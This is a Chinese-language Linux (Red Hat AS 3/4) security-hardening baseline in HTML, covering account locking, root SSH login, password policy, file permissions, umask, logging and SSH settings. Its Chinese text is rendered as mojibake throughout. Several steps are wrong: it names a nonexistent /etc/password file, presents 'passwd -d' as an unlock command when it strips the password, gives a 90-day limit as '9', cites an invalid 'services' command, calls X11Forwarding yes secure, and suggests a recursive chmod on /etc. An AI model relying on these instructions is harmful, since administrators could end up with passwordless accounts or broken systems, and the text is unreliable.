    <content><![CDATA[<h1 id="linuxå®‰å…¨é…ç½®åŸºçº¿"><a href="#linuxå®‰å…¨é…ç½®åŸºçº¿" class="headerlink" title="linuxå®‰å…¨é…ç½®åŸºçº¿"></a>linuxå®‰å…¨é…ç½®åŸºçº¿</h1><h1 id="ä¸€ã€å…±äº«è´¦å·æ£€æŸ¥"><a href="#ä¸€ã€å…±äº«è´¦å·æ£€æŸ¥" class="headerlink" title="ä¸€ã€å…±äº«è´¦å·æ£€æŸ¥"></a>ä¸€ã€å…±äº«è´¦å·æ£€æŸ¥</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®åç§°ï¼šç”¨æˆ·è´¦å·åˆ†é…æ£€æŸ¥ï¼Œé¿å…å…±äº«è´¦å·å­˜åœ¨</span><br><span class="line">é…ç½®è¦æ±‚ï¼š1ã€ç³»ç»Ÿéœ€æŒ‰ç…§å®é™…ç”¨æˆ·åˆ†é…è´¦å·ï¼›</span><br><span class="line">          2ã€é¿å…ä¸åŒç”¨æˆ·é—´å…±äº«è´¦å·ï¼Œé¿å…ç”¨æˆ·è´¦å·å’ŒæœåŠ¡å™¨é—´é€šä¿¡ä½¿ç”¨çš„è´¦å·å…±äº«ã€‚</span><br><span class="line">æ“ä½œæŒ‡å—ï¼šå‚è€ƒé…ç½®æ“ä½œï¼šcat /etc/passwdæŸ¥çœ‹å½“å‰æ‰€æœ‰ç”¨æˆ·çš„æƒ…å†µï¼›</span><br><span class="line">æ£€æŸ¥æ–¹æ³•ï¼šå‘½ä»¤cat /etc/passwdæŸ¥çœ‹å½“å‰æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯ï¼Œä¸ç®¡ç†å‘˜ç¡®è®¤æ˜¯å¦æœ‰å…±äº«è´¦å·æƒ…å†µå­˜åœ¨ã€‚</span><br><span class="line">é…ç½®æ–¹æ³•ï¼šå¦‚éœ€å»ºç«‹ç”¨æˆ·ï¼Œå‚è€ƒå¦‚ä¸‹ï¼š</span><br><span class="line">          #useradd username  #åˆ›å»ºè´¦å·</span><br><span class="line">          #passwd username   #è®¾ç½®å¯†ç </span><br><span class="line">          ä½¿ç”¨è¯¥å‘½ä»¤ä¸ºä¸åŒçš„ç”¨æˆ·åˆ†é…ä¸åŒçš„è´¦å·ï¼Œè®¾ç½®ä¸åŒçš„å£ä»¤åŠæƒé™ä¿¡æ¯ç­‰ã€‚</span><br><span class="line">é€‚ç”¨ç‰ˆæœ¬ï¼šLinux Redhat AS 3ã€Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="äºŒã€å¤šä½™è´¦æˆ·é”å®š"><a href="#äºŒã€å¤šä½™è´¦æˆ·é”å®š" class="headerlink" title="äºŒã€å¤šä½™è´¦æˆ·é”å®š"></a>äºŒã€å¤šä½™è´¦æˆ·é”å®š</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®åç§°ï¼šå¤šä½™è´¦æˆ·é”å®šç­–ç•¥</span><br><span class="line">é…ç½®è¦æ±‚ï¼šåº”é”å®šä¸è®¾å¤‡è¿è¡Œã€ç»´æŠ¤ç­‰å·¥ä½œæ— å…³çš„è´¦å·ã€‚</span><br><span class="line">æ“ä½œæŒ‡å—ï¼šå‚è€ƒé…ç½®æ“ä½œï¼š</span><br><span class="line">          æŸ¥çœ‹é”å®šç”¨æˆ·ï¼š</span><br><span class="line">          # cat /etc/passwordï¼ŒæŸ¥çœ‹å“ªäº›è´¦æˆ·çš„shellåŸŸä¸­ä¸ºnologinï¼›</span><br><span class="line">æ£€æŸ¥æ–¹æ³•ï¼šäººå·¥æ£€æŸ¥ï¼š</span><br><span class="line">          ïµ	# cat /etc/passwordåæŸ¥çœ‹å¤šä½™è´¦æˆ·çš„shellåŸŸä¸ºnologinä¸ºç¬¦åˆï¼›</span><br><span class="line">          BVSåŸºçº¿æ£€æŸ¥ï¼š</span><br><span class="line">          ïµ	å¤šä½™è´¦æˆ·å¤„äºé”å®šçŠ¶æ€ä¸ºç¬¦åˆã€‚</span><br><span class="line">é…ç½®æ–¹æ³•ï¼šé”å®šç”¨æˆ·ï¼š</span><br><span class="line">        ï¬ä¿®æ”¹/etc/passwordæ–‡ä»¶ï¼Œå°†éœ€è¦é”å®šçš„ç”¨æˆ·çš„shellåŸŸè®¾ä¸ºnologinï¼›</span><br><span class="line">        ï¬æˆ–é€šè¿‡#passwd â€“l usernameé”å®šè´¦æˆ·ï¼›</span><br><span class="line">        åªæœ‰å…·å¤‡è¶…çº§ç”¨æˆ·æƒé™çš„ä½¿ç”¨è€…æ–¹å¯ä½¿ç”¨#passwd â€“l usernameé”å®šç”¨æˆ·,ç”¨#passwd â€“d usernameè§£é”ååŸæœ‰å¯†ç å¤±æ•ˆï¼Œç™»å½•éœ€è¾“å…¥æ–°å¯†ç ã€‚</span><br><span class="line">        è¡¥å……æ“ä½œè¯´æ˜ï¼š</span><br><span class="line">        ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œéœ€è¦é”å®šçš„ç”¨æˆ·ï¼šlp,nuucp,hpdb,www,demon</span><br><span class="line">é€‚ç”¨ç‰ˆæœ¬ï¼šLinux Redhat AS 3ã€Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="ä¸‰ã€rootè´¦æˆ·ç™»å½•æ§åˆ¶"><a href="#ä¸‰ã€rootè´¦æˆ·ç™»å½•æ§åˆ¶" class="headerlink" title="ä¸‰ã€rootè´¦æˆ·ç™»å½•æ§åˆ¶"></a>ä¸‰ã€rootè´¦æˆ·ç™»å½•æ§åˆ¶</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®åç§°ï¼šrootè´¦æˆ·è¿œç¨‹ç™»å½•è´¦æˆ·é™åˆ¶</span><br><span class="line">é…ç½®è¦æ±‚ï¼š1ã€é™åˆ¶å…·å¤‡è¶…çº§ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·è¿œç¨‹ç™»å½•ã€‚</span><br><span class="line">          2ã€è¿œç¨‹æ‰§è¡Œç®¡ç†å‘˜æƒé™æ“ä½œï¼Œåº”å…ˆä»¥æ™®é€šæƒé™ç”¨æˆ·è¿œç¨‹ç™»å½•åï¼Œå†åˆ‡æ¢åˆ°è¶…çº§ç®¡ç†å‘˜æƒé™è´¦å·åæ‰§è¡Œç›¸åº”æ“ä½œã€‚</span><br><span class="line">æ“ä½œæŒ‡å—ï¼šä½¿ç”¨rootè´¦æˆ·è¿œç¨‹å°è¯•ç™»é™†</span><br><span class="line">æ£€æŸ¥æ–¹æ³•ï¼š1ã€rootè¿œç¨‹ç™»å½•ä¸æˆåŠŸï¼Œæç¤ºâ€œNot on system consoleâ€ï¼›</span><br><span class="line">         2ã€æ™®é€šç”¨æˆ·å¯ä»¥ç™»å½•æˆåŠŸï¼Œè€Œä¸”å¯ä»¥åˆ‡æ¢åˆ°rootç”¨æˆ·ï¼›</span><br><span class="line">é…ç½®æ–¹æ³•ï¼šä¿®æ”¹/etc/ssh/sshd_configæ–‡ä»¶ï¼Œå°†PermitRootLogin yesæ”¹ä¸ºPermitRootLogin noï¼Œé‡å¯sshdæœåŠ¡ã€‚</span><br><span class="line">é€‚ç”¨ç‰ˆæœ¬ï¼šLinux Redhat AS 3ã€Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="å››ã€å£ä»¤å¤æ‚åº¦è¦æ±‚"><a href="#å››ã€å£ä»¤å¤æ‚åº¦è¦æ±‚" class="headerlink" title="å››ã€å£ä»¤å¤æ‚åº¦è¦æ±‚"></a>å››ã€å£ä»¤å¤æ‚åº¦è¦æ±‚</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®åç§°ï¼šæ“ä½œç³»ç»Ÿå£ä»¤å¤æ‚åº¦ç­–ç•¥</span><br><span class="line">é…ç½®è¦æ±‚ï¼šå£ä»¤é•¿åº¦è‡³å°‘12ä½ï¼Œå¹¶åŒ…æ‹¬æ•°å­—ã€å°å†™å­—æ¯ã€å¤§å†™å­—æ¯å’Œç‰¹æ®Šç¬¦å·ã€‚</span><br><span class="line">æ“ä½œæŒ‡å—ï¼š1ã€å‚è€ƒé…ç½®æ“ä½œ</span><br><span class="line">        # cat /etc/pam.d/system-authï¼Œæ‰¾åˆ°passwordæ¨¡å—æ¥å£çš„é…ç½®éƒ¨åˆ†ï¼Œæ‰¾åˆ°ç±»ä¼¼å¦‚ä¸‹çš„é…ç½®è¡Œï¼š</span><br><span class="line">        password  requisite  /lib/security/$ISA/pam_cracklib.so minlen =6</span><br><span class="line">        2ã€è¡¥å……æ“ä½œè¯´æ˜</span><br><span class="line">        å‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š</span><br><span class="line">        1ã€retry=Nï¼Œç¡®å®šç”¨æˆ·åˆ›å»ºå¯†ç æ—¶å…è®¸é‡è¯•çš„æ¬¡æ•°ï¼›</span><br><span class="line">        2ã€minlen=Nï¼Œç¡®å®šå¯†ç æœ€å°é•¿åº¦è¦æ±‚ï¼Œäº‹å®ä¸Šï¼Œåœ¨é»˜è®¤é…ç½®ä¸‹ï¼Œæ­¤å‚æ•°ä»£è¡¨å¯†ç æœ€å°é•¿åº¦ä¸ºN-1ï¼›</span><br><span class="line">        3ã€dcredit=Nï¼Œå½“Nå°äº0æ—¶ï¼Œä»£è¡¨æ–°å¯†ç ä¸­æ•°å­—å­—ç¬¦æ•°é‡ä¸å¾—å°‘äºï¼ˆ-Nï¼‰ä¸ªã€‚ä¾‹å¦‚ï¼Œdcredit=-2ä»£è¡¨å¯†ç ä¸­è¦è‡³å°‘åŒ…å«ä¸¤ä¸ªæ•°å­—å­—ç¬¦ï¼›</span><br><span class="line">        4ã€ucredit=Nï¼Œå½“Nå°äº0æ—¶ï¼Œä»£è¡¨åˆ™æ–°å¯†ç ä¸­å¤§å†™å­—ç¬¦æ•°é‡ä¸å¾—å°‘äºï¼ˆ-Nï¼‰ä¸ªï¼›</span><br><span class="line">        5ã€lcredit=Nï¼Œå½“Nå°äº0æ—¶ï¼Œä»£è¡¨åˆ™æ–°å¯†ç ä¸­å°å†™å­—ç¬¦æ•°é‡ä¸å¾—å°‘äºï¼ˆ-Nï¼‰ä¸ªï¼›</span><br><span class="line">        6ã€ocredit=Nï¼Œå½“Nå°äº0æ—¶ï¼Œä»£è¡¨åˆ™æ–°å¯†ç ä¸­ç‰¹æ®Šå­—ç¬¦æ•°é‡ä¸å¾—å°‘äºï¼ˆ-Nï¼‰ä¸ªï¼›</span><br><span class="line">æ£€æŸ¥æ–¹æ³•ï¼š# cat /etc/pam.d/system-authï¼Œå‚è€ƒæ“ä½œæŒ‡å—æ£€æŸ¥å¯¹åº”å‚æ•°</span><br><span class="line">         ïµ	å£ä»¤çš„æœ€å°é•¿åº¦è‡³å°‘12ä½</span><br><span class="line">         ïµ	å£ä»¤æœ€å°‘åº”åŒ…å«çš„å­—ç¬¦æ•°é‡</span><br><span class="line">         ïµ	å£ä»¤ä¸­æœ€å°‘åº”åŒ…å«çš„å­—æ¯å­—ç¬¦æ•°é‡</span><br><span class="line">         ïµ	å£ä»¤ä¸­æœ€å°‘åº”åŒ…å«çš„éå­—æ¯æ•°å­—å­—ç¬¦æ•°é‡</span><br><span class="line">         é€šè¿‡ä»¥ä¸Š4å­é¡¹çš„è¾“å‡ºç»¼åˆåˆ¤æ–­è¯¥é¡¹æ˜¯å¦æ»¡è¶³ã€‚</span><br><span class="line">é…ç½®æ–¹æ³•ï¼š# vi /etc/pam.d/system-authï¼Œæ‰¾åˆ°passwordæ¨¡å—æ¥å£çš„é…ç½®éƒ¨åˆ†ï¼ŒæŒ‰ç…§é…ç½®è¦æ±‚å†…å®¹ä¿®æ”¹å¯¹åº”å±æ€§ã€‚</span><br><span class="line">é€‚ç”¨ç‰ˆæœ¬ï¼šLinux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="äº”ã€å£ä»¤æœ€é•¿ç”Ÿå­˜æœŸç­–ç•¥"><a href="#äº”ã€å£ä»¤æœ€é•¿ç”Ÿå­˜æœŸç­–ç•¥" class="headerlink" title="äº”ã€å£ä»¤æœ€é•¿ç”Ÿå­˜æœŸç­–ç•¥"></a>äº”ã€å£ä»¤æœ€é•¿ç”Ÿå­˜æœŸç­–ç•¥</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®åç§°ï¼šå£ä»¤æœ€é•¿ç”Ÿå­˜æœŸç­–ç•¥</span><br><span class="line">é…ç½®è¦æ±‚ï¼šè¦æ±‚æ“ä½œç³»ç»Ÿçš„è´¦æˆ·å£ä»¤çš„æœ€é•¿ç”Ÿå­˜æœŸä¸é•¿äº90å¤©</span><br><span class="line">æ“ä½œæŒ‡å—ï¼š# cat /etc/login.defsæ–‡ä»¶ä¸­æŒ‡å®šé…ç½®é¡¹ï¼Œå…¶ä¸­ï¼š</span><br><span class="line">          PASS_MAX_DAYSé…ç½®é¡¹å†³å®šå¯†ç æœ€é•¿ä½¿ç”¨æœŸé™ï¼›</span><br><span class="line">          PASS_MIN_DAYSé…ç½®é¡¹å†³å®šå¯†ç æœ€çŸ­ä½¿ç”¨æœŸé™ï¼›</span><br><span class="line">          PASS_WARN_AGEé…ç½®é¡¹å†³å®šå¯†ç åˆ°æœŸæé†’æ—¶é—´ã€‚</span><br><span class="line">æ£€æŸ¥æ–¹æ³•ï¼šPASS_MAX_DAYSå€¼å°äºç­‰äº90ä¸ºç¬¦åˆï¼›</span><br><span class="line">         â€œå¯¹äºé‡‡ç”¨é™æ€å£ä»¤è®¤è¯æŠ€æœ¯çš„è®¾å¤‡ï¼Œè´¦æˆ·å£ä»¤çš„ç”Ÿå­˜æœŸä¸é•¿äº90å¤©â€é¡¹çš„å½“å‰å€¼ï¼šè¡¨ç¤ºå½“å‰çš„å£ä»¤ç”Ÿå­˜æœŸé•¿åº¦ã€‚</span><br><span class="line">é…ç½®æ–¹æ³•ï¼švi /etc/login.defsæ–‡ä»¶ï¼Œä¿®æ”¹PASS_MAX_DAYSå€¼ä¸ºå°äºç­‰äº9</span><br><span class="line">é€‚ç”¨ç‰ˆæœ¬ï¼šLinux Redhat AS 3ã€Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="å…­ã€ç³»ç»Ÿå…³é”®ç›®å½•è®¿é—®æƒé™"><a href="#å…­ã€ç³»ç»Ÿå…³é”®ç›®å½•è®¿é—®æƒé™" class="headerlink" title="å…­ã€ç³»ç»Ÿå…³é”®ç›®å½•è®¿é—®æƒé™"></a>å…­ã€ç³»ç»Ÿå…³é”®ç›®å½•è®¿é—®æƒé™</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®åç§°ï¼šå…³é”®ç›®å½•æƒé™æ§åˆ¶</span><br><span class="line">é…ç½®è¦æ±‚ï¼šæ ¹æ®å®‰å…¨éœ€è¦ï¼Œé…ç½®æŸäº›å…³é”®ç›®å½•å…¶æ‰€éœ€çš„æœ€å°æƒé™ï¼›</span><br><span class="line">          é‡ç‚¹è¦æ±‚passwordé…ç½®æ–‡ä»¶ã€shadowæ–‡ä»¶ã€groupæ–‡ä»¶æƒé™ã€‚</span><br><span class="line">         å½“å‰ä¸»æµç‰ˆæœ¬çš„linuxç³»ç»Ÿåœ¨é»˜è®¤æƒ…å†µä¸‹å³å¯¹é‡è¦æ–‡ä»¶åšäº†å¿…è¦çš„æƒé™è®¾ç½®ï¼Œåœ¨æ—¥å¸¸ç®¡ç†å’Œæ“ä½œè¿‡ç¨‹ä¸­åº”é¿å…ä¿®æ”¹æ­¤ç±»æ–‡ä»¶æƒé™ï¼Œé™¤æ­¤ä»¥å¤–ï¼Œ</span><br><span class="line">         åº”å®šæœŸå¯¹æƒé™è¿›è¡Œæ£€æŸ¥åŠå¤æ ¸ï¼Œç¡®ä¿æƒé™è®¾ç½®æ­£ç¡®ã€‚</span><br><span class="line">æ“ä½œæŒ‡å—ï¼šæŸ¥çœ‹å…³é”®ç›®å½•çš„ç”¨æˆ·å¯¹åº”æƒé™å‚è€ƒå‘½ä»¤</span><br><span class="line">          ls -l /etc/passwd</span><br><span class="line">          ls -l /etc/shadow</span><br><span class="line">          ls -l /etc/group</span><br><span class="line">æ£€æŸ¥æ–¹æ³•ï¼šä¸ç®¡ç†å‘˜ç¡®è®¤å·²æœ‰æƒé™ä¸ºæœ€å°æƒé™ã€‚</span><br><span class="line">é…ç½®æ–¹æ³•ï¼šå‚è€ƒé…ç½®æ“ä½œï¼š</span><br><span class="line">        é€šè¿‡chmodå‘½ä»¤å¯¹ç›®å½•çš„æƒé™è¿›è¡Œå®é™…è®¾ç½®ã€‚</span><br><span class="line">        è¡¥å……æ“ä½œè¯´æ˜ï¼š</span><br><span class="line">        	/etc/passwd æ‰€æœ‰ç”¨æˆ·éƒ½å¯è¯»ï¼Œrootç”¨æˆ·å¯å†™ â€“rw-râ€”râ€” </span><br><span class="line">        é…ç½®å‘½ä»¤ï¼šchmod 644 /etc/passwd</span><br><span class="line">        	/etc/shadow åªæœ‰rootå¯è¯» â€“r-------- </span><br><span class="line">        é…ç½®å‘½ä»¤ï¼šchmod 600 /etc/shadowï¼›</span><br><span class="line">        	/etc/group å¿…é¡»æ‰€æœ‰ç”¨æˆ·éƒ½å¯è¯»ï¼Œrootç”¨æˆ·å¯å†™ â€“rw-râ€”râ€”</span><br><span class="line">        é…ç½®å‘½ä»¤ï¼šchmod 644 /etc/groupï¼›</span><br><span class="line">        å¦‚æœæ˜¯æœ‰å†™æƒé™ï¼Œå°±éœ€ç§»å»ç»„åŠå…¶å®ƒç”¨æˆ·å¯¹/etcçš„å†™æƒé™ï¼ˆç‰¹æ®Šæƒ…å†µé™¤å¤–ï¼‰æ‰§è¡Œå‘½ä»¤#chmod -R go-w,o-r /etc</span><br><span class="line">é€‚ç”¨ç‰ˆæœ¬ï¼šLinux Redhat AS 3ã€Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="ä¸ƒã€ç”¨æˆ·ç¼ºçœæƒé™æ§åˆ¶"><a href="#ä¸ƒã€ç”¨æˆ·ç¼ºçœæƒé™æ§åˆ¶" class="headerlink" title="ä¸ƒã€ç”¨æˆ·ç¼ºçœæƒé™æ§åˆ¶"></a>ä¸ƒã€ç”¨æˆ·ç¼ºçœæƒé™æ§åˆ¶</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®åç§°ï¼šç”¨æˆ·ç¼ºçœæƒé™æ§åˆ¶</span><br><span class="line">é…ç½®è¦æ±‚ï¼šæ§åˆ¶ç”¨æˆ·ç¼ºçœè®¿é—®æƒé™ï¼Œå½“åœ¨åˆ›å»ºæ–°æ–‡ä»¶æˆ–ç›®å½•æ—¶åº”å±è”½æ‰æ–°æ–‡ä»¶æˆ–ç›®å½•ä¸åº”æœ‰çš„è®¿é—®å…è®¸æƒé™,é˜²æ­¢åŒå±äº</span><br><span class="line">è¯¥ç»„çš„å…¶å®ƒç”¨æˆ·åŠåˆ«çš„ç»„çš„ç”¨æˆ·ä¿®æ”¹è¯¥ç”¨æˆ·çš„æ–‡ä»¶æˆ–æ›´é«˜é™åˆ¶ã€‚</span><br><span class="line">æ“ä½œæŒ‡å—ï¼š1ã€# cat /etc/bashrc  æŸ¥çœ‹å…¨å±€é»˜è®¤è®¾ç½®umaskå€¼</span><br><span class="line">          2ã€æŸ¥çœ‹å…·ä½“ç”¨æˆ·homeç›®å½•ä¸‹bash_profileï¼Œå…·ä½“ç”¨æˆ·çš„umask</span><br><span class="line">æ£€æŸ¥æ–¹æ³•ï¼šæŸ¥çœ‹å…¨å±€é»˜è®¤è®¾ç½®umaskå€¼ä¸º027æˆ–æ›´å°æƒé™ä¸ºç¬¦åˆï¼ˆå¦‚æœ‰ç‰¹è®¸æƒé™éœ€æ±‚ï¼Œå¯æ ¹æ®å®é™…æƒ…å†µåˆ¤æ–­ï¼‰ï¼›</span><br><span class="line">          æŸ¥çœ‹å…·ä½“ç”¨æˆ·çš„umaskï¼Œæœ¬ç€æœ€å°æƒé™çš„åŸåˆ™ã€‚</span><br><span class="line">é…ç½®æ–¹æ³•ï¼šå‚è€ƒé…ç½®æ“ä½œï¼š</span><br><span class="line">          å•ç‹¬é’ˆå¯¹ç”¨æˆ·è®¾ç½®</span><br><span class="line">          å¯ä¿®æ”¹ç”¨æˆ·homeç›®å½•ä¸‹çš„.bash_profileè„šæœ¬æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼Œå¯å¢åŠ ä¸€æ¡è¯­å¥ï¼šumask 027ï¼›å¯¹äºæƒé™è¦æ±‚è¾ƒä¸¥æ ¼çš„åœºåˆï¼Œå»ºè®®è®¾ç½®ä¸º077ã€‚</span><br><span class="line">          å…¨å±€é»˜è®¤è®¾ç½®ï¼š</span><br><span class="line">          é»˜è®¤é€šè¿‡å…¨å±€è„šæœ¬/etc/bashrcè®¾ç½®æ‰€æœ‰ç”¨æˆ·çš„é»˜è®¤umaskå€¼ï¼Œä¿®æ”¹è„šæœ¬å³å¯å®ç°å¯¹ç”¨æˆ·é»˜è®¤umaskå€¼çš„å…¨å±€æ€§ä¿®æ”¹ï¼Œ</span><br><span class="line">          é€šå¸¸å»ºè®®å°†umaskè®¾ç½®ä¸º027ä»¥ä¸Šï¼Œå¯¹äºæƒé™è¦æ±‚è¾ƒä¸¥æ ¼çš„åœºåˆï¼Œå»ºè®®è®¾ç½®ä¸º077ã€‚</span><br><span class="line">é€‚ç”¨ç‰ˆæœ¬ï¼šLinux Redhat AS 3ã€Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="å…«ã€å®‰å…¨æ—¥å¿—å®Œå¤‡æ€§è¦æ±‚"><a href="#å…«ã€å®‰å…¨æ—¥å¿—å®Œå¤‡æ€§è¦æ±‚" class="headerlink" title="å…«ã€å®‰å…¨æ—¥å¿—å®Œå¤‡æ€§è¦æ±‚"></a>å…«ã€å®‰å…¨æ—¥å¿—å®Œå¤‡æ€§è¦æ±‚</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®åç§°ï¼šå®‰å…¨æ—¥å¿—å®Œå¤‡æ€§è¦æ±‚</span><br><span class="line">é…ç½®è¦æ±‚ï¼šç³»ç»Ÿåº”é…ç½®å®Œå¤‡æ—¥å¿—è®°å½•ï¼Œè®°å½•å¯¹ä¸ç³»ç»Ÿç›¸å…³çš„å®‰å…¨äº‹ä»¶ã€‚</span><br><span class="line">æ“ä½œæŒ‡å—ï¼š1ã€# cat /etc/syslog.confæŸ¥çœ‹æ˜¯å¦æœ‰å¯¹åº”é…ç½®</span><br><span class="line">          2ã€# cat /var/log/secureæŸ¥çœ‹æ˜¯å¦æœ‰å¯¹åº”é…ç½®</span><br><span class="line">æ£€æŸ¥æ–¹æ³•ï¼š1ã€cat /etc/syslog.confç¡®è®¤æœ‰å¯¹åº”é…ç½®ï¼›</span><br><span class="line">          2ã€æŸ¥çœ‹/var/log/secureï¼Œåº”è®°å½•æœ‰éœ€è¦çš„è®¾å¤‡ç›¸å…³çš„å®‰å…¨äº‹ä»¶ã€‚</span><br><span class="line">é…ç½®æ–¹æ³•ï¼šä¿®æ”¹é…ç½®æ–‡ä»¶vi /etc/syslog.confã€‚</span><br><span class="line">          é…ç½®å¦‚ä¸‹ç±»ä¼¼è¯­å¥ï¼š</span><br><span class="line">          authpriv.*			/var/log/secure</span><br><span class="line">          å®šä¹‰ä¸ºéœ€è¦ä¿å­˜çš„è®¾å¤‡ç›¸å…³å®‰å…¨äº‹ä»¶ã€‚</span><br><span class="line">é€‚ç”¨ç‰ˆæœ¬ï¼šLinux Redhat AS 3ã€Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="ä¹ã€ç»Ÿä¸€è¿œç¨‹æ—¥å¿—æœåŠ¡å™¨é…ç½®"><a href="#ä¹ã€ç»Ÿä¸€è¿œç¨‹æ—¥å¿—æœåŠ¡å™¨é…ç½®" class="headerlink" title="ä¹ã€ç»Ÿä¸€è¿œç¨‹æ—¥å¿—æœåŠ¡å™¨é…ç½®"></a>ä¹ã€ç»Ÿä¸€è¿œç¨‹æ—¥å¿—æœåŠ¡å™¨é…ç½®</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®åç§°ï¼šç»Ÿä¸€è¿œç¨‹æ—¥å¿—æœåŠ¡å™¨é…ç½®</span><br><span class="line">é…ç½®è¦æ±‚ï¼šå½“å‰ç³»ç»Ÿåº”é…ç½®è¿œç¨‹æ—¥å¿—åŠŸèƒ½ï¼Œå°†éœ€è¦é‡ç‚¹å…³æ³¨çš„æ—¥å¿—å†…å®¹ä¼ è¾“åˆ°æ—¥å¿—æœåŠ¡å™¨è¿›è¡Œå¤‡ä»½ã€‚</span><br><span class="line">æ“ä½œæŒ‡å—ï¼š# cat /etc/syslog.confæŸ¥çœ‹æ˜¯å¦æœ‰å¯¹åº”é…ç½®</span><br><span class="line">æ£€æŸ¥æ–¹æ³•ï¼šé…ç½®äº†è¿œç¨‹æ—¥å¿—æœåŠ¡å™¨ä¸ºç¬¦åˆ</span><br><span class="line">é…ç½®æ–¹æ³•ï¼š1ã€å‚è€ƒé…ç½®æ“ä½œ</span><br><span class="line">          ä¿®æ”¹é…ç½®æ–‡ä»¶vi /etc/syslog.confï¼Œ</span><br><span class="line">          åŠ ä¸Šè¿™ä¸€è¡Œï¼š</span><br><span class="line">          *.* @192.168.0.1</span><br><span class="line">          å¯ä»¥å°†&quot;*.*&quot;æ›¿æ¢ä¸ºä½ å®é™…éœ€è¦çš„æ—¥å¿—ä¿¡æ¯ã€‚æ¯”å¦‚ï¼škern.* / mail.* ç­‰ç­‰ï¼›å¯ä»¥å°†æ­¤å¤„192.168.0.1æ›¿æ¢ä¸ºå®é™…çš„IPæˆ–åŸŸåã€‚</span><br><span class="line">          é‡æ–°å¯åŠ¨syslogæœåŠ¡ï¼Œæ‰§è¡Œä¸‹åˆ—å‘½ä»¤ï¼š</span><br><span class="line">          services syslogd restart</span><br><span class="line">          2ã€è¡¥å……æ“ä½œè¯´æ˜</span><br><span class="line">          æ³¨æ„ï¼š*.*å’Œ@ä¹‹é—´ä¸ºä¸€ä¸ªTab</span><br><span class="line">é€‚ç”¨ç‰ˆæœ¬ï¼šLinux Redhat AS 3ã€Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="åã€è®¾ç½®historyæ—¶é—´æˆ³"><a href="#åã€è®¾ç½®historyæ—¶é—´æˆ³" class="headerlink" title="åã€è®¾ç½®historyæ—¶é—´æˆ³"></a>åã€è®¾ç½®historyæ—¶é—´æˆ³</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®åç§°ï¼šè®¾ç½®historyæ—¶é—´æˆ³</span><br><span class="line">é…ç½®è¦æ±‚ï¼šé…ç½®historyæ—¶é—´æˆ³ï¼Œä¾¿äºå®¡è®¡ã€‚</span><br><span class="line">æ“ä½œæŒ‡å—ï¼š# cat /etc/bashrcæŸ¥çœ‹æ˜¯å¦æœ‰å¯¹åº”é…ç½®</span><br><span class="line">æ£€æŸ¥æ–¹æ³•ï¼šå·²æ·»åŠ ï¼Œå¦‚ï¼šâ€œexport HISTTIMEFORMAT=&quot;%F %Tâ€é…ç½®ä¸ºç¬¦åˆã€‚</span><br><span class="line">é…ç½®æ–¹æ³•ï¼šå‚è€ƒé…ç½®æ“ä½œï¼š</span><br><span class="line">          åœ¨/etc/bashrcæ–‡ä»¶ä¸­å¢åŠ å¦‚ä¸‹è¡Œï¼š</span><br><span class="line">          export HISTTIMEFORMAT=&quot;%F %T</span><br><span class="line">é€‚ç”¨ç‰ˆæœ¬ï¼šLinux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="åä¸€ã€sshç™»å½•é…ç½®"><a href="#åä¸€ã€sshç™»å½•é…ç½®" class="headerlink" title="åä¸€ã€sshç™»å½•é…ç½®"></a>åä¸€ã€sshç™»å½•é…ç½®</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®åç§°ï¼šSSHç™»å½•é…ç½®</span><br><span class="line">é…ç½®è¦æ±‚ï¼šç³»ç»Ÿåº”é…ç½®ä½¿ç”¨SSHç­‰åŠ å¯†åè®®è¿›è¡Œè¿œç¨‹ç™»å½•ç»´æŠ¤ï¼Œå¹¶å®‰å…¨é…ç½®SSHDçš„è®¾ç½®ã€‚ä¸ä½¿ç”¨TELENTè¿›è¡Œè¿œç¨‹ç™»å½•ç»´æŠ¤ã€‚</span><br><span class="line">æ“ä½œæŒ‡å—ï¼š1ã€æŸ¥çœ‹SSHæœåŠ¡çŠ¶æ€ï¼š# ps â€“elf|grep sshï¼›</span><br><span class="line">          2ã€æŸ¥çœ‹telnetæœåŠ¡çŠ¶æ€ï¼š# ps â€“elf|grep telnetã€‚</span><br><span class="line">æ£€æŸ¥æ–¹æ³•ï¼š1ã€	ä¸èƒ½ä½¿ç”¨telnetè¿›è¡Œè¿œç¨‹ç»´æŠ¤ï¼›</span><br><span class="line">          2ã€	åº”ä½¿ç”¨SSHè¿›è¡Œè¿œç¨‹ç»´æŠ¤ï¼›</span><br><span class="line">          3ã€	SSHé…ç½®è¦ç¬¦åˆå¦‚ä¸‹è¦æ±‚ï¼›</span><br><span class="line">              Protocol  2 #ä½¿ç”¨ssh2ç‰ˆæœ¬</span><br><span class="line">              X11Forwarding yes #å…è®¸çª—å£å›¾å½¢ä¼ è¾“ä½¿ç”¨sshåŠ å¯†</span><br><span class="line">              IgnoreRhosts  yes#å®Œå…¨ç¦æ­¢SSHDä½¿ç”¨.rhostsæ–‡ä»¶</span><br><span class="line">              RhostsAuthentication no 